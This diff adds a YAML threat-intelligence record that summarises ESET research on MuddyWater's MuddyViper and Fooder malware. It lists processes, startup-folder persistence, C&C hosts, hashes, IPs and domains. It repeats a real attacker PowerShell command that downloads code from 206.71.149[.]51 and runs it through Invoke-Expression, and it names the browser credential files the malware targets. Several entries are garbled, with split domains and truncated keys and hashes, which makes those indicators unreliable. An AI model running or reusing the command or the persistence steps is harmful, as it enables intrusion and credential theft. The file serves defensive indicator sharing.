@@ -1,0 +1,174 @@
+description: MuddyViper uses PowerShell and cmd.exe to execute commands, employs AES-CBC
+  encryption for C&C communications, and leverages various tools for remote access
+  and data exfiltration.
+attribution: MuddyWater (TA450)
+malware_families:
+- Fooder
+- MuddyViper
+- CE-Notes
+- LP-Notes
+- Blub
+- gosocks5
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - chrome.exe
+  - taskhostw.exe
+  commandline:
+  - C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials
+    -UseBasicParsing -Uri http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169).content| Invoke-Expression
+  - '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" (Invoke-WebRequest
+    -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169).content
+    | Invoke-Expression'
+  - C:\\windows\\system32\\cmd.exe
+  - C:\\windows\\system32\\WindowsPo werShell\\v1.0\\Powershell.exe
+  powershell:
+  - (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVe
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVe rsion\\Explorer\\User Shell Folders\\Startup
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVe rsion\\Explorer\\Shell Folders\\Startup
+  image_load:
+  - nss3.dll
+  - wtsapi32.dll
+  - msi.dll
+  - Launcher.dll
+  - ncrypt.dll
+  - WinWin .exe
+  - Launcher .exe
+  - vcruntime140_1 .dll
+  - WinWin(persist) .exe
+  - 0bff183a39ruQsY .dll
+  network_connections:
+  - MuddyViper, processplanet[.]org, 443
+  - MuddyViper, 35.175.224[.]64, 443
+  - taskhostw.exe->http://206.71.149[.]51:443
+  - chrome.exe->https://*
+  - MuddyWater C&C server.3.95.7[.]142
+  - MuddyWater staging and C&C server.194.11.246[.]78
+  - MuddyWater C&C server.194.11.246[.]101
+  file_activity:
+  - C:\\Users\\win\\Desktop\\Fooder\\Debug\\Launcher.pdb
+  - C:\\Users\\pc\\Desktop\\main\\My_Project\\Fooder\\x64\\Debug\\Launcher.pdb
+  - C:\\Users\\pc\\source\\repos\\ConsoleApplication7\\x64\\Release\\ConsoleApplication7.pdb
+  - '%USERPROFILE%\\Downloads\\OsUpdater.exe'
+  - C:\\system2
+  - C:\\system2.dll
+  - C:\\Users\\Public\\Downloads\\system2.dll
+  - C:\\Intel\\system.dll
+  - C:\\20240926_165509.exe
+  - C:\\Users\\Public\\Downloads\\lp-notes.txt
+  - C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Local State
+  - C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State
+  - C:\\Users\\<username>\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State
+  - '%APPDATAROAMING%\\Mozilla\\Firefox\\Profiles\\<profile_name>\\logins.json'
+  - file.txt
+  - CacheDump.zip
+  - Win64/MuddyWater.GMuddyWater Fooder loader with embedded HackBrowserData tool.
+  - WinGo/TrojanProxy .Agent.DMuddyWater gosocks5 reverse tunnel.
+  persistence:
+  - ManageOnDriveUpdater scheduled task
+  - Startup folder registry keys
+  - scheduled task named ManageOnDriveUpdater
+  - copy itself to the victims Startup folder
+  - setsuppersistence
+  - ManageOnDriveUpdater
+  process_relations: []
+IOCs:
+  hashes:
+  - 76632910CF67697BF5D7285FAE38BFCF438EC082
+  - 9262A37DF166AC1D5F582AAC79F54CCB47623BFD9BA001228D284AE13A08F52F
+  - 76632910CF67697BF5D7
+  - 1723D5EA7185D2E339FA
+  - 69B097D8A3205605506E
+  - B7A8F09CB5FF8A336539
+  - B8997526E4781A6A1479
+  - 8E21DE54638A79D8489C
+  - CD47420F5CE408D95C98
+  - C1299E8C9A8567A9C292
+  - 29CDA06701F9A9C0A679
+  - 8F3ED626E7B929450E36
+  - 007B5CD6D6ACF972F774
+  - CD36F93DBC4C71893059
+  - 47B70C47BEB33E88B419
+  - D46900D78AE036967E0B
+  - 0657D0B0610618886DDD
+  - 2939FD218E0145D730BD
+  - 3BC6502A55A4D5D29132
+  - 7950296331802188EB99
+  - 8580824FE14DB1583881
+  - B48B93B4EB69D01588D3
+  - EA8A1C2382FF765709D7
+  - EAF4BAFC62170C9FCA1F
+  - F5EFBA6CCBA5A6AD6C3A
+  - 13DA612D75DC5268F523
+  - 25361183DE63F296BA71
+  - 0E9A4892CFA1C9065B36
+  - 2B09241CA025BDC4455E
+  - 2E9BE23CDD8152DB6CD1
+  - 45FA7DE711FEA1F8D1E3
+  - 4E0EF2386980639FC535
+  - 4E9529BA4A6E42D6278D
+  - 50C6D4A2AD16A231CF11
+  - 52009F36058337B6401D
+  - 535882B6EDAB29247E03
+  - 544CE18E4C1F1B288DEE
+  - 54EBC125039CC83E4682
+  - 5A08150C1DC17E9F6912
+  - 5D1E61DA8083C41FF1FC
+  - 6532E0437C8913FA418F
+  - 6CA41565844118385B34
+  - 6FC50A99AAE1D6C40111
+  - 826CFF5D85713CE4B2F3
+  - 87ADD79C7C8335447113
+  - 93055115559219BE8441
+  - 97C3376AB551E899F347
+  - 99FAD0862E2E8D363F3E
+  - A101CBCCD950AA36FC3B
+  - A227C0A4425E24268B75
+  - A997A7AAE727D2C12CCE
+  - B0271CA76052EC340014
+  - B0CD4F5DF192BFFE6500
+  - B16E7D56A8DC0FF6B3AF
+  - D49979D0063B28BD7339
+  - D518F5C648AB64B390A2
+  - DF223D653F761ED55F9C
+  - DF8FC5213AA11EE445EA
+  - E02DD79A8CAED662969F
+  - E8F4EA3857EF5FDFEC1A
+  - F26CAE9E79871DF3A47F
+  - FF09608790077E1BA52C
+  - A9747A3F58F8F408FECE
+  - 1723D5EA7185D2E339FA9529D245DAA5D5C9A932
+  - 69B097D8A3205605506E6C1CC3C13B71091CB519
+  ip_addresses:
+  - 206.71.149[.]51
+  - 35.175.224[.]64
+  - 3.95.7[.]142
+  - 51.16.209[.]105
+  - 62.106.66[.]112
+  - 157.20.182[.]45
+  - 161.35.172[.]55
+  - 167.99.224[.]13
+  - 194.11.246[.]78
+  - 194.11.246[.]101
+  - 212.232.22[.]136
+  domains:
+  - processplanet[.]org
+  - api.tikavod
+  - magically
+  - processplan
+  - api.tikavod ot.co[.]il
+  - magically day[.]com
+  - processplan et[.]org
+  urls:
+  - http://206.71.149[.]51:443/57576?filter_relational_operator_2=60169
+authors:
+- ESET Research
+reference: https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/
+date_of_publication: December 02, 2025
+file_creation_date: December 04, 2025
